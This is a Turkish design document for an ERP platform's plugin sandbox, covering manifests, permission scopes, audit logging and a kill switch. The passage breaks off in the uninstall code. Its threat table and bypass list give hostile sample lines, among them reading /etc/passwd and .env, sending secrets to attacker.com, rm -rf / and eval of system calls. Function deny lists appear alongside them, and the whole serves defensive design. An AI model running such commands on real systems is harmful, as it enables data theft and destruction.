# 10 — Plugin System & Sandbox

**Project:** Kurumsal ERP Platform
**Belge:** Plugin Mimarisi, Sandbox İzolasyonu, Developer Ekosistemi, Plugin Audit
**Version:** 1.0
**Last Updated:** 2026-11-06
**Status:** Design Document — henüz kodlanmadı
**Depends On:** 00-manifesto.md, 01-multi-tenancy.md, 02-data-model.md, 03-feature-flags.md, 04-module-system.md, 05-meta-structure.md, 06-layer-role-system.md, 07-custom-entity.md, 08-event-bus.md, 09-api-first.md

---

## 1. Bu Belgenin Amacı

Bu belge, platformun **plugin sistemini** tanımlar — üçüncü taraf geliştiricilerin (ve tenant'ların) ana platformu bozmadan **yeni yetenekler eklemesini** sağlayan mimari. İçerir:

- Plugin nedir, module ve custom entity'den farkı
- Plugin türleri (public, private, custom)
- Plugin manifest (`plugin.json`)
- Plugin lifecycle (draft → review → published → deprecated)
- **Sandbox architecture** — güvenli izolasyon
- **Permission system** (scopes) — plugin neye erişebilir
- **Plugin audit** — owner'ın plugin'i denetlemesi (kullanıcının sorusuna cevap)
- Installation / upgrade / uninstall
- Developer experience (SDK, CLI, dev environment)
- Marketplace entegrasyonu
- Performance, security, testing
- Roadmap

**Hedef kitle:** Geliştiriciler, AI asistanlar, güvenlik denetçileri, ürün mimarları, plugin developer'ları.

**Kritik:** Plugin sistemi, **ekosistemin temeli**. Salesforce AppExchange, Shopify App Store, Odoo Apps — hepsi bu modelle %100 pazar kapsamına ulaştı. Biz de aynı modeli kuruyoruz.

---

## 2. Plugin Nedir?

### 2.1. Tanım

**Plugin** = bir developer'ın platforma eklediği **kod paketi**. Ana platformun içine gömülmez — **sandbox'ta** çalışır, **event bus** üzerinden dinler, **API** üzerinden çağırır.

### 2.2. Plugin vs Module vs Custom Entity

| Kavram | Kim yazar | Nerede | Güven | Kod |
|---|---|---|---|---|
| **Module** | Platform (biz) | Her tenant | Tam | Bizim |
| **Plugin** | Developer / partner / tenant | Seçili tenant | Sandbox | 3rd party |
| **Custom Entity** | Tenant admin | Sadece kendi tenant | Metadata | Kod yok |
| **Custom Field** | Tenant admin | Mevcut varlığa alan | Metadata | Kod yok |

**Kural:** Module = **bizim yazdığımız**, Plugin = **dışarıdan gelen**, Custom = **kullanıcı tanımlı**.

### 2.3. Plugin Ne Yapabilir?

✅ **Yapabilir:**
- API çağırma (izinli endpoint'ler)
- Event dinleme (subscribe)
- Custom entity tanımlama
- Custom UI ekranı (iframe/web component)
- Webhook gönderme
- Veri okuma/yazma (izinli scope)
- Kendi ayarlarını saklama
- Arka plan job çalıştırma

❌ **Yapamaz:**
- Ana platform kodunu değiştirme
- Başka tenant'ın verisine erişim
- Başka plugin'in verisine erişim
- RLS bypass
- Superadmin yetkisi
- Sistem dosyalarına erişim
- Keyfi network erişimi
- Sonsuz CPU/RAM tüketimi

### 2.4. Plugin Örnekleri

| Plugin | Ne yapar | Kategori |
|---|---|---|
| **Wolt Integration** | Wolt siparişlerini platforma aktarır | Integration |
| **E-Fatura GİB** | Faturaları GİB'e gönderir | Compliance |
| **Trendyol Sync** | Trendyol ürünlerini senkronize eder | Integration |
| **Restaurant POS** | Restoran satış ekranı | Vertical |
| **Restaurant KDS** | Mutfak ekranı | Vertical |
| **Advanced Reports** | Ek raporlar | Analytics |
| **Slack Notifications** | Slack'e bildirim | Communication |
| **Stripe Payments** | Ödeme kabul | Payment |
| **AI OCR** | Fatura görselinden veri çıkarma | AI |
| **WhatsApp** | WhatsApp mesaj | Communication |

**Toplam:** Sınırsız plugin (Belge 00 — sıfır limit).

---

## 3. Plugin Türleri

### 3.1. Public Plugin (Marketplace)

**Kim yazar:** Independent developer / partner
**Nerede yayınlanır:** Marketplace
**Kim kurar:** Herhangi tenant (onaylı)
**Kod:** Public (marketplace'te)

**Örnek:** Wolt Integration — herkes kurabilir.

### 3.2. Private Plugin (Tenant-specific)

**Kim yazar:** Developer (tenant için)
**Nerede yayınlanır:** Sadece tenant'ın panelinde
**Kim kurar:** Sadece hedef tenant
**Kod:** Private (sadece tenant görür)

**Örnek:** Tesfirma'nın özel raporu — sadece Tesfirma kullanır.

### 3.3. Custom Module (Tenant self-service)

**Kim yazar:** Tenant admin (kendi)
**Nerede:** Tenant panelinde
**Kim kurar:** Sadece kendisi
**Kod:** Tenant içinde (marketplace'e çıkmaz)

**Örnek:** Kendi ekranım, kendi workflow'um.

### 3.4. Partner Plugin (Enterprise)

**Kim yazar:** Onaylı partner
**Nerede yayınlanır:** Marketplace (verified badge)
**Kod:** Public ama partner imzalı
**Destek:** Partner tarafından

**Örnek:** Klinik ERP (sağlık partneri) — sertifikalı.

---

## 4. Plugin Manifest — `plugin.json`

### 4.1. Tam Yapı

```json
{
    "key": "wolt-integration",
    "name": "Wolt Integration",
    "version": "1.2.0",
    "description": "Wolt siparişlerini platforma aktarır",
    "author": {
        "id": "dev-ali",
        "name": "Ali Yılmaz",
        "email": "ali@example.com",
        "website": "https://ali.dev",
        "verified": true
    },
    "license": "MIT",
    
    "type": "public",
    "category": "integration",
    "tags": ["wolt", "delivery", "food"],
    
    "requires": {
        "platform": ">=1.0.0",
        "php": ">=8.3",
        "modules": ["otc", "inv"],
        "plugins": [],
        "features": ["otc.enabled", "inv.enabled"]
    },
    
    "permissions": [
        "otc.sales_order.read",
        "otc.sales_order.create",
        "inv.product.read",
        "integration.http:wolt.com",
        "event.subscribe:otc.sales_order.created"
    ],
    
    "settings": {
        "wolt_api_key": {
            "type": "string",
            "required": true,
            "secret": true,
            "label": "Wolt API Key"
        },
        "auto_sync": {
            "type": "boolean",
            "default": true,
            "label": "Otomatik senkronizasyon"
        },
        "sync_interval": {
            "type": "integer",
            "default": 5,
            "min": 1,
            "max": 60,
            "label": "Senkronizasyon aralığı (dakika)"
        }
    },
    
    "ui": {
        "menu": [
            {
                "label": "Wolt Siparişleri",
                "route": "/plugins/wolt/orders",
                "icon": "shopping-cart"
            }
        ],
        "settings_page": true
    },
    
    "migrations": "migrations/",
    "entry": "src/Plugin.php",
    "assets": "assets/",
    
    "sandbox": {
        "runtime": "docker",
        "cpu_limit": "0.5",
        "memory_limit": "256M",
        "timeout": 30,
        "network": "whitelist"
    },
    
    "pricing": {
        "model": "monthly",
        "amount": 500,
        "currency": "TRY",
        "trial_days": 14
    },
    
    "signature": "sha256:abc123def456...",
    "signed_by": "marketplace-platform-key",
    
    "support": {
        "email": "support@ali.dev",
        "docs": "https://docs.ali.dev/wolt",
        "issues": "https://github.com/ali/wolt/issues"
    },
    
    "changelog": [
        {
            "version": "1.2.0",
            "date": "2026-11-06",
            "changes": ["Fix: Rate limit", "Add: Auto retry"]
        },
        {
            "version": "1.1.0",
            "date": "2026-10-15",
            "changes": ["Add: Menu sync"]
        }
    ]
}
4.2. Zorunlu Alanlar
Alan	Zorunlu	Açıklama
key	✅	Benzersiz plugin kodu (slug)
name	✅	Görünen isim
version	✅	Semver
author	✅	Developer bilgisi
requires	✅	Platform/module bağımlılığı
permissions	✅	İzin listesi
entry	✅	Ana PHP dosyası
signature	✅	Güvenlik imzası
4.3. Plugin Entry
php
// src/Plugin.php
namespace Plugins\WoltIntegration;

use App\Plugins\BasePlugin;

class Plugin extends BasePlugin
{
    public function boot(): void
    {
        // Event dinle
        $this->subscribe('otc.sales_order.created', [$this, 'onOrderCreated']);
        
        // Kendi route'larını kaydet
        $this->routes('routes.php');
        
        // Ayarları yükle
        $this->loadSettings();
    }
    
    public function onOrderCreated($event): void
    {
        // Wolt'a gönder
        $this->api()->post('https://wolt.com/api/orders', [
            'order_id' => $event->aggregateId,
            // ...
        ]);
    }
}
Kural: Plugin sadece BasePlugin interface'ini implemente eder. Ana platforma doğrudan erişim yok.

5. Plugin Lifecycle
5.1. Aşamalar
text
Draft → Review → Published → (Deprecated) → Archived
5.2. Aşama Detayları
Aşama	Ne	Kim yapar
Draft	Developer geliştiriyor	Developer
Submitted	Marketplace'e gönderdi	Developer
Review	Güvenlik + kalite kontrol	Platform
Approved	Onaylandı, yayın hazır	Platform
Published	Marketplace'te satışta	Otomatik
Deprecated	Kullanımdan kaldırma	Developer / Platform
Archived	Satıştan kaldırıldı	Developer / Platform
Banned	Güvenlik ihlali	Platform
5.3. Review Süreci
Otomatik kontroller:

✅ Syntax valid

✅ Signature valid

✅ Dependency resolution

✅ Security scan (SAST)

✅ Malware scan

✅ License check

✅ Version semver valid

✅ No hardcoded secrets

Manuel kontroller:

✅ Kod review (güvenlik odaklı)

✅ Permission justification (her izin gerekli mi)

✅ Documentation quality

✅ Functionality test (sandbox)

Süre: 3-7 iş günü (public), 1-2 gün (partner).

5.4. Review Fail
Reddedilme nedenleri:

❌ Güvenlik açığı

❌ Aşırı izin talebi

❌ Ana platforma müdahale

❌ Kötü niyetli davranış

❌ Kötü kod kalitesi

❌ Documentation eksik

Developer'a feedback: Detaylı rapor + düzeltme önerileri.

6. Sandbox Architecture — Güvenlik
6.1. Neden Sandbox?
Problem: PHP kodu her şeye erişebilir — dosya sistemi, veritabanı, network, başka process'ler.

Kötü niyetli plugin senaryoları:

Saldırı	Etki
file_get_contents('/etc/passwd')	Sistem dosyası okuma
DB::table('users')->delete()	Tüm veriyi silme
file_get_contents('http://attacker.com?data=' . $secret)	Veri sızıntısı
while(true) {}	CPU tüketimi
exec('rm -rf /')	Sistem tahribi
RLS bypass	Cross-tenant erişim
Çözüm: Sandbox.

6.2. Sandbox Mimarisi — Katmanlı
text
┌────────────────────────────────────────────────────────────┐
│  KATMAN 1: Network Isolation                              │
│  ─ Sadece whitelist domain'lere erişim                    │
│  ─ Wolt plugin → sadece wolt.com                          │
│  ─ DNS, HTTP, HTTPS kontrol                               │
└────────────────────────────────────────────────────────────┘
┌────────────────────────────────────────────────────────────┐
│  KATMAN 2: File System Isolation                          │
│  ─ open_basedir: sadece plugin klasörü                    │
│  ─ /etc, /var, /home erişim YOK                           │
│  ─ Symlink takibi YOK                                     │
└────────────────────────────────────────────────────────────┘
┌────────────────────────────────────────────────────────────┐
│  KATMAN 3: Function Restriction                           │
│  ─ disable_functions: exec, system, shell_exec, passthru  │
│  ─ eval, assert, create_function YASAK                    │
│  ─ proc_open, popen YASAK                                 │
│  ─ curl_exec (sadece API üzerinden)                       │
└────────────────────────────────────────────────────────────┘
┌────────────────────────────────────────────────────────────┐
│  KATMAN 4: Resource Limits                                │
│  ─ CPU: 0.5 core                                          │
│  ─ RAM: 256 MB                                            │
│  ─ Timeout: 30 sn                                         │
│  ─ File: 100 MB                                           │
│  ─ DB query: 5 sn, 100 rows                               │
└────────────────────────────────────────────────────────────┘
┌────────────────────────────────────────────────────────────┐
│  KATMAN 5: Database Isolation                             │
│  ─ RLS zorunlu (tenant_id)                                │
│  ─ Kullanıcı sadece kendi tenant'ı                        │
│  ─ Cross-tenant erişim YOK                                │
│  ─ Salt-okunur schema (bazı tablolar)                     │
└────────────────────────────────────────────────────────────┘
┌────────────────────────────────────────────────────────────┐
│  KATMAN 6: Permission Scope                               │
│  ─ Plugin sadece izinli scope'ları kullanır               │
│  ─ otc.sales_order.read → sadece okuma                    │
│  ─ otc.sales_order.create → oluşturma                     │
│  ─ Scope dışı çağrı → 403                                 │
└────────────────────────────────────────────────────────────┘
┌────────────────────────────────────────────────────────────┐
│  KATMAN 7: Process Isolation (Docker)                     │
│  ─ Her plugin kendi container'ında                        │
│  ─ Ana uygulama ile iletişim: API/RPC                     │
│  ─ Container escape koruması (seccomp)                    │
└────────────────────────────────────────────────────────────┘
6.3. Container Per Plugin (En Güvenli)
Yapı:

text
Platform Container              Plugin Container
┌────────────────────┐         ┌────────────────────┐
│  Laravel App       │         │  Plugin (PHP)      │
│  ─ Livewire        │         │  ─ İzole FS        │
│  ─ API             │  ←RPC→  │  ─ İzole network   │
│  ─ DB              │         │  ─ İzole user      │
│  ─ Auth            │         │  ─ Resource limit  │
└────────────────────┘         └────────────────────┘
        ↓                               ↓
        └───────────┬───────────────────┘
                    ↓
              ┌──────────┐
              │  Redis   │ (message bus)
              │  RabbitMQ│
              └──────────┘
Avantaj:

✅ Tam izolasyon (container escape son derece zor)

✅ Resource limit (docker native)

✅ Crash safe (plugin çöker, platform devam)

✅ Version isolation (her plugin farklı PHP)

Dezavantaj:

❌ Overhead (container startup)

❌ Complexity (orchestration)

❌ Cost (memory per plugin)

6.4. Process Pool (Orta Güvenlik, Daha Hızlı)
Yapı: Plugin'ler aynı container'da, ayrı PHP-FPM pool'da.

ini
; /etc/php/8.3/fpm/pool.d/plugin-wolt.conf
[plugin-wolt]
user = plugin-wolt
group = plugin-wolt
listen = /var/run/php/plugin-wolt.sock

; Kaynak limitleri
pm = dynamic
pm.max_children = 5
pm.start_servers = 1
pm.max_requests = 500

; File access
php_admin_value[open_basedir] = /var/www/plugins/wolt:/tmp/plugin-wolt
php_admin_value[disable_functions] = exec,system,shell_exec,passthru,proc_open,popen,eval,assert
php_admin_value[allow_url_fopen] = Off
php_admin_value[upload_max_filesize] = 10M

; Memory
php_admin_value[memory_limit] = 256M
php_admin_value[max_execution_time] = 30
Avantaj:

✅ Daha hızlı (container startup yok)

✅ OS-level user isolation

✅ Resource limit

✅ open_basedir koruma

Dezavantaj:

⚠️ Kernel escape riski (container'dan yüksek)

⚠️ PHP version sabit (pool başına)

6.5. WASM (En Hafif, En Yeni)
Yapı: Plugin → WASM'a compile (php-wasm ile).

Avantaj:

✅ Tam izolasyon (linear memory)

✅ Milisaniye startup

✅ Cross-platform

✅ Deterministik

Dezavantaj:

❌ PHP desteği sınırlı (php-wasm gelişmekte)

❌ Native kütüphane sorunları

❌ Tooling genç

Karar: Hibrit — küçük plugin'ler WASM, büyük plugin'ler container.

6.6. Karar Kriteri
Plugin Türü	Sandbox
Core module	Sandbox yok (bizim)
Trusted partner	Process pool
Public plugin (marketplace)	Container per plugin
Private plugin (tenant)	Container veya process pool
Sadece data (custom entity)	Metadata (sandbox yok, zaten kod yok)
6.7. Sandbox Bypass Yasakları
Plugin kodu şu yöntemleri kullanamaz:

php
// ❌ File access
file_get_contents('/etc/passwd');       // open_basedir engeller
fopen('/var/www/html/.env', 'r');       // open_basedir engeller
scandir('..');                          // open_basedir engeller

// ❌ Command execution
exec('ls -la');                         // disable_functions engeller
system('cat /etc/passwd');              // disable_functions engeller
shell_exec('curl attacker.com');        // disable_functions engeller
proc_open('rm -rf /', []);              // disable_functions engeller
popen('ls', 'r');                       // disable_functions engeller
`ls`;                                   // backtick = shell_exec engellenir

// ❌ Dynamic code
eval('system("rm -rf /");');            // eval engellenir
assert('system("...")');                // assert engellenir
create_function('', '...');             // deprecated + engellenir
preg_replace('/.*/e', '...', $input);   // /e engellenir

// ❌ Network (whitelist dışı)
curl_exec(curl_init('http://attacker.com')); // whitelist
file_get_contents('http://attacker.com');     // allow_url_fopen=Off
fsockopen('attacker.com', 80);               // whitelist

// ❌ Cross-tenant
DB::table('users')->get();              // RLS engeller
DB::table('fin_customer')->get();       // RLS (kendi tenant dışı)
Bypass engelleme: Static analysis + runtime monitoring.

7. Permission System — Plugin Scope
7.1. Neden Scope?
Plugin her şeyi yapabilir mi? Hayır. Plugin, manifest'te belirttiği izinler dışına çıkamaz.

7.2. Scope Kategorileri
Kategori	Örnek	Açıklama
Entity	otc.sales_order.read	Entity okuma/yazma
Feature	feature:otc.enabled	Feature flag erişim
Event	event.subscribe:otc.sales_order.created	Event dinleme
HTTP	integration.http:wolt.com	Dış HTTP
Network	integration.ip:192.168.1.0/24	IP whitelist
Storage	storage.write:plugin-own	Dosya yazma
Config	config:plugin-own	Kendi ayarları
UI	ui.menu, ui.settings_page	UI katkısı
7.3. Entity Scope
Format: <module>.<entity>.<action>[.<field>]

yaml
permissions:
  - "otc.sales_order.read"
  - "otc.sales_order.create"
  - "otc.sales_order.read.total"        # sadece total alanı
  - "inv.product.read.code,name"        # sadece code, name
  - "fin.customer.read"                  # tüm alanlar
Kısıt: Hassas alanlar (tax_no, password_hash, iban) kısıtlanabilir.

7.4. Event Scope
yaml
permissions:
  - "event.subscribe:otc.sales_order.created"
  - "event.subscribe:inv.stock.below_minimum"
  - "event.publish:custom.wolt.order_imported"  # kendi event'i
Kısıt: Plugin sadece izinli event'leri dinleyebilir.

7.5. HTTP Scope
yaml
permissions:
  - "integration.http:wolt.com"           # sadece wolt.com
  - "integration.http:*.wolt.com"         # subdomain'ler
  - "integration.http:api.trendyol.com"
Kısıt: Whitelist dışı domain → 403.

Header kontrolü:

Rate limit (10/dk)

Response size limit (10MB)

Timeout (30 sn)

No redirect (SSRF koruması)

7.6. Storage Scope
yaml
permissions:
  - "storage.write:plugin-own"     # sadece kendi klasörü
  - "storage.read:plugin-own"
  - "storage.read:tenant-uploads"  # tenant'ın yüklediği dosyalar
Yol: /var/www/storage/plugins/wolt-integration/

Kısıt: Plugin sadece kendi klasörüne yazabilir. Başka plugin'in klasörü → 403.

7.7. Scope Onayı
Kurulum sırasında:

text
┌──────────────────────────────────────────────────────────┐
│  Wolt Integration kurulacak                              │
│  Bu plugin aşağıdaki izinlere erişecek:                  │
├──────────────────────────────────────────────────────────┤
│  ✅ Satış siparişleri — Okuma                            │
│  ✅ Satış siparişleri — Oluşturma                        │
│  ✅ Ürünler — Okuma                                      │
│  ✅ HTTP: wolt.com                                       │
│  ✅ Event dinleme: otc.sales_order.created               │
│                                                          │
│  ⚠️ Bu izinler plugin'in Wolt API ile çalışması         │
│     için gereklidir.                                     │
│                                                          │
│  [Vazgeç]  [Onayla]                                      │
└──────────────────────────────────────────────────────────┘
Kural: Tenant admin her izni görür ve onaylar. Şeffaflık.

7.8. Runtime Scope Enforcement
php
class ScopedApiClient {
    public function call(string $method, string $endpoint, array $data): mixed {
        $permission = $this->mapToPermission($method, $endpoint);
        
        if (!in_array($permission, $this->plugin->permissions)) {
            throw new ScopeViolationException(
                "Plugin {$this->plugin->key} lacks permission: {$permission}"
            );
        }
        
        // Audit
        EventStore::create([
            'event_type' => 'plugin.api_call',
            'aggregate_type' => 'plugin',
            'aggregate_id' => $this->plugin->id,
            'payload' => [
                'method' => $method,
                'endpoint' => $endpoint,
                'permission' => $permission,
            ],
        ]);
        
        return $this->internalCall($method, $endpoint, $data);
    }
}
Kural: Her API çağrısı audit + scope check.

8. Plugin Audit — Owner'ın Denetimi
8.1. Kullanıcının Sorusu
"Ben, yani StokPro Enterprise'ın sahibi, hangi developer hangi şirkete hangi plugin'i ekledi, pluginin içeriği ne, hepsini audit edebilecek miyiz?"

Cevap: EVET — 3 seviyede.

8.2. 3 Seviyeli Audit
Seviye	Owner görür	Kapsam
L1: Metadata Audit	Developer kim, hangi tenant, hangi plugin, hangi versiyon, ne zaman, kim kurdu	Tam görünür
L2: Behavioral Audit	Plugin runtime'da ne yaptı — API çağrıları, event'ler, data erişimi, dış HTTP	Tam görünür
L3: Code Audit	Kaynak kodu, dependency'ler, signature	Marketplace gate'te incelenir
8.3. L1: Metadata Audit
Her plugin kurulumu kayıt altına alınır:

sql
CREATE TABLE plugin_installation (
    id              uuid PRIMARY KEY,
    plugin_id       uuid NOT NULL REFERENCES plugin(id),
    plugin_version  varchar(20) NOT NULL,
    tenant_id       uuid NOT NULL REFERENCES tenants(id),
    installed_by    bigint NOT NULL REFERENCES users(id),
    installed_at    timestamptz NOT NULL DEFAULT now(),
    status          varchar(20) DEFAULT 'active',
    settings        jsonb,
    uninstalled_at  timestamptz NULL,
    uninstalled_by  bigint NULL
);

CREATE TABLE plugin_audit_log (
    id              uuid PRIMARY KEY,
    plugin_id       uuid NOT NULL,
    tenant_id       uuid,
    action          varchar(50) NOT NULL,   -- installed, upgraded, uninstalled, config_changed, api_called, error
    actor_id        bigint,
    details         jsonb,
    ip              inet,
    created_at      timestamptz DEFAULT now()
);
Owner dashboard'da:

text
┌────────────────────────────────────────────────────────────┐
│  Plugin Audit Dashboard                                    │
├────────────────────────────────────────────────────────────┤
│  Filtre: [Developer ▾] [Tenant ▾] [Plugin ▾] [Date ▾]     │
├────────────────────────────────────────────────────────────┤
│  Wolt Integration v1.2.0                                   │
│  Developer: Ali Yılmaz (dev-ali) — verified                │
│  ────────────────────────────────────────────              │
│  Tenant            │ Tarih       │ Kurulum                  │
│  ────────────────────────────────────────────              │
│  Tesfirma Ltd.     │ 2026-11-01  │ admin@tesfirma.com      │
│  ABC Gıda          │ 2026-10-15  │ admin@abcgida.com       │
│  XYZ Restoran      │ 2026-09-20  │ it@xyz.com              │
│                                                            │
│  [Detay Gör] [Kod İncele] [Kullanıcıları Gör]             │
└────────────────────────────────────────────────────────────┘
Owner her kurulumu görür:

Hangi developer → hangi tenant → hangi plugin

Hangi tenant admin kurdu

Hangi tarihte

Hangi versiyon

8.4. L2: Behavioral Audit
Plugin runtime'da her aksiyonu kayıt altına alınır:

Aksiyon	Kayıt
API çağrısı	Hangi endpoint, hangi veri, response status
Event dinleme	Hangi event, ne yaptı
Data erişimi	Hangi entity, hangi satır sayısı (PII maskeli)
Dış HTTP	Hangi domain, response size
Hata	Exception, stack trace (kısaltılmış)
Resource	CPU, RAM, süre
Scope violation	Hangi izin, hangi endpoint
Şema:

sql
CREATE TABLE plugin_behavior_log (
    id              uuid PRIMARY KEY,
    plugin_id       uuid NOT NULL,
    tenant_id       uuid NOT NULL,
    action          varchar(50) NOT NULL,   -- api_call, event, data_access, http, error, scope_violation
    details         jsonb NOT NULL,
    duration_ms     integer,
    success         boolean,
    created_at      timestamptz DEFAULT now()
);

CREATE INDEX idx_plugin_behavior_tenant ON plugin_behavior_log(tenant_id, created_at DESC);
CREATE INDEX idx_plugin_behavior_plugin ON plugin_behavior_log(plugin_id, created_at DESC);
Örnek kayıt:

json
{
    "plugin_id": "uuid-wolt",
    "tenant_id": "uuid-tesfirma",
    "action": "api_call",
    "details": {
        "method": "POST",
        "endpoint": "/api/v1/otc/sales-orders",
        "permission": "otc.sales_order.create",
        "order_number": "SO-2026-001",
        "items_count": 3
    },
    "duration_ms": 45,
    "success": true
}
Owner dashboard'da:

text
┌────────────────────────────────────────────────────────────┐
│  Wolt Integration — Behavioral Audit                       │
│  Tenant: Tesfirma Ltd.                                     │
├────────────────────────────────────────────────────────────┤
│  Son 24 saat:                                              │
│  ────────────────────────────────────────────              │
│  API çağrıları: 1.234                                     │
│    └ otc.sales_order.create: 234                          │
│    └ otc.sales_order.read: 800                            │
│    └ inv.product.read: 200                                │
│                                                            │
│  Event dinleme: 234                                       │
│    └ otc.sales_order.created: 234                         │
│                                                            │
│  Dış HTTP: 458                                            │
│    └ wolt.com: 458                                        │
│                                                            │
│  Hata: 2                                                  │
│    └ 429 rate limit (wolt.com): 2                         │
│                                                            │
│  Scope violation: 0                                       │
│                                                            │
│  Resource kullanımı:                                      │
│    └ CPU: 0.3 core (60% limit)                            │
│    └ RAM: 120 MB (47% limit)                              │
│    └ Avg süre: 45 ms                                      │
└────────────────────────────────────────────────────────────┘
8.5. L3: Code Audit
Marketplace gate'te:

Kod, yayınlanmadan önce incelenir:

yaml
code_review:
  static_analysis:
    - "semgrep scan"
    - "phpstan level 8"
    - "psalm"
    - "composer audit"
  
  security_scan:
    - "snyk test"
    - "trivy scan"
    - "OWASP Dependency Check"
  
  manual_review:
    - "permission justification"
    - "no hardcoded secrets"
    - "no backdoors"
    - "no remote code execution"
    - "no data exfiltration"
Owner, review sonucunu görür:

text
┌────────────────────────────────────────────────────────────┐
│  Wolt Integration — Code Review                            │
├────────────────────────────────────────────────────────────┤
│  Static Analysis:    ✅ PASS                               │
│  Security Scan:      ✅ PASS (0 critical, 0 high)          │
│  Manual Review:      ✅ APPROVED by security team          │
│  ────────────────────────────────────────────              │
│  Reviewer Notları:                                         │
│  - Kod kalitesi yüksek                                     │
│  - İzinler minimum gerekli seviyede                        │
│  - API key güvenli saklanıyor                              │
│  - Error handling iyi                                      │
│                                                            │
│  Signature: sha256:abc123...                               │
│  Signed by: marketplace-platform-key                       │
└────────────────────────────────────────────────────────────┘
Owner kod görebilir mi?

Evet — ama sınırlı:

Marketplace public plugin → kod açık (GitHub'da)

Private plugin → owner talep + onay ile görür

Partner plugin → owner + partner anlaşması ile

Kural: Owner güvenlik nedeniyle kodu görebilir. Ama IP korunur — owner kodu kopyalayıp kullanamaz (legal agreement).

8.6. Owner'ın Denetim Sınırları
Şey	Owner görür	Sınır
Developer kim	✅	—
Hangi tenant	✅	—
Hangi plugin	✅	—
Kurulum zamanı	✅	—
Kurulum yapan	✅	—
Runtime davranış	✅	—
API çağrıları	✅	Payload masked (PII)
Data erişimi	✅	Sayı + entity type (satır içeriği yok)
Dış HTTP	✅	Domain + status (body yok)
Hatalar	✅	Stack trace kısaltılmış
Kaynak kodu	✅	Sadece güvenlik incelemesi için
Ticari algoritma	❌	Developer IP'si
Tenant'ın iş verisi	❌	KVKK/GDPR (tenant'a ait)
Kritik: Owner plugin'in ne yaptığını görür, tenant'ın ne yaptığını görmez (gizlilik).

8.7. Audit Retention
Log Tipi	Saklama
Installation	Süresiz
Behavior (api_call)	90 gün
Behavior (error)	1 yıl
Behavior (scope_violation)	7 yıl (güvenlik)
Code review	Süresiz
8.8. Anomali Tespiti
Plugin davranışı anormal mi?

php
class PluginAnomalyDetector {
    public function detect(Plugin $plugin): array {
        $anomalies = [];
        
        // 1. Error rate spike
        $errorRate = $this->errorRate($plugin, hours: 1);
        if ($errorRate > 0.1) { // %10
            $anomalies[] = "Error rate: " . ($errorRate * 100) . "% (normal <5%)";
        }
        
        // 2. Scope violation
        $violations = $this->scopeViolations($plugin, hours: 24);
        if ($violations > 0) {
            $anomalies[] = "Scope violations: {$violations}";
        }
        
        // 3. Unusual data access
        $dataAccess = $this->dataAccessCount($plugin, hours: 1);
        if ($dataAccess > 10000) {  // normal < 1000
            $anomalies[] = "Unusual data access: {$dataAccess} rows/hour";
        }
        
        // 4. Unusual HTTP
        $httpDomains = $this->httpDomains($plugin, hours: 24);
        $unexpected = array_diff($httpDomains, $plugin->allowed_domains);
        if (!empty($unexpected)) {
            $anomalies[] = "Unusual domains: " . implode(',', $unexpected);
        }
        
        // 5. Resource spike
        if ($this->cpuUsage($plugin) > 0.8) {
            $anomalies[] = "CPU spike: " . ($this->cpuUsage($plugin) * 100) . "%";
        }
        
        return $anomalies;
    }
}
Alarm: Owner'a email + in-app notification.

8.9. Plugin Kill Switch
Owner tek tıkla plugin'i kapatabilir:

php
class PluginKillSwitch {
    public function kill(Plugin $plugin, string $reason): void {
        // 1. Tüm tenant'larda devre dışı
        DB::table('plugin_installation')
            ->where('plugin_id', $plugin->id)
            ->update(['status' => 'suspended', 'suspended_reason' => $reason]);
        
        // 2. Marketplace'ten kaldır
        $plugin->update(['status' => 'banned']);
        
        // 3. Event bus bağlantısını kes
        EventBus::unsubscribe($plugin);
        
        // 4. Container'ları durdur
        Docker::stopContainers($plugin);
        
        // 5. Audit
        PluginAuditLog::create([
            'plugin_id' => $plugin->id,
            'action' => 'killed_by_owner',
            'actor_id' => auth()->id(),
            'details' => ['reason' => $reason],
        ]);
        
        // 6. Developer'a bildirim
        Notification::send($plugin->author, 'plugin_killed', $reason);
    }
}
Kural: Owner anında herhangi bir plugin'i durdurabilir (güvenlik).

9. Plugin Installation Flow
9.1. Kurulum Adımları
text
1. Tenant admin marketplace'te plugin seçer
    ↓
2. "Kur" butonuna basar
    ↓
3. Permission onay ekranı (tüm izinler gösterilir)
    ↓
4. Admin onaylar → signature verify
    ↓
5. Dependency kontrol (modules, features)
    ↓
6. Sandbox oluştur (container)
    ↓
7. Plugin migration'ları çalıştır
    ↓
8. Settings formu (API key, etc.)
    ↓
9. Plugin aktif → event subscription
    ↓
10. Audit log
9.2. Dependency Check
php
class DependencyResolver {
    public function check(Plugin $plugin, Tenant $tenant): DependencyResult {
        $result = new DependencyResult();
        
        // 1. Platform version
        if (!$this->versionMatch($plugin->requires['platform'], config('app.version'))) {
            $result->addError("Platform version mismatch");
        }
        
        // 2. Modules
        foreach ($plugin->requires['modules'] ?? [] as $module) {
            if (!Features::enabled("{$module}.enabled")) {
                $result->addError("Module {$module} not enabled");
            }
        }
        
        // 3. Features
        foreach ($plugin->requires['features'] ?? [] as $feature) {
            if (!Features::enabled($feature)) {
                $result->addError("Feature {$feature} not enabled");
            }
        }
        
        // 4. Other plugins
        foreach ($plugin->requires['plugins'] ?? [] as $pluginKey) {
            if (!$tenant->hasPlugin($pluginKey)) {
                $result->addError("Required plugin {$pluginKey} not installed");
            }
        }
        
        return $result;
    }
}
9.3. Migration
php
class PluginMigrator {
    public function migrate(Plugin $plugin): void {
        // 1. Yeni migration'ları çalıştır
        $migrations = glob($plugin->path . '/migrations/*.php');
        foreach ($migrations as $file) {
            $migration = require $file;
            $migration->up();
        }
        
        // 2. Migration history
        foreach ($migrations as $file) {
            DB::table('plugin_migrations')->insert([
                'plugin_id' => $plugin->id,
                'migration' => basename($file),
                'batch' => $this->nextBatch($plugin),
                'ran_at' => now(),
            ]);
        }
    }
}
Kural: Plugin migration'ları RLS zorunlu — sandbox içinde de.

9.4. Rollback
php
class PluginRollback {
    public function rollback(Plugin $plugin, string $toVersion): void {
        // 1. Migration'ları geri al
        $migrations = DB::table('plugin_migrations')
            ->where('plugin_id', $plugin->id)
            ->where('batch', '>', $this->batchFor($plugin, $toVersion))
            ->orderBy('batch', 'desc')
            ->get();
        
        foreach ($migrations as $m) {
            $file = $plugin->path . '/migrations/' . $m->migration;
            $migration = require $file;
            $migration->down();
        }
        
        // 2. Plugin version'ı geri al
        $plugin->update(['version' => $toVersion]);
        
        // 3. Audit
        PluginAuditLog::create([
            'plugin_id' => $plugin->id,
            'action' => 'rolled_back',
            'details' => ['to_version' => $toVersion],
        ]);
    }
}
9.5. Uninstall
php
class PluginUninstaller {
    public function uninstall(Plugin $plugin, Tenant $tenant, bool $deleteData = false): void {
        // 1. Event unsubscribe
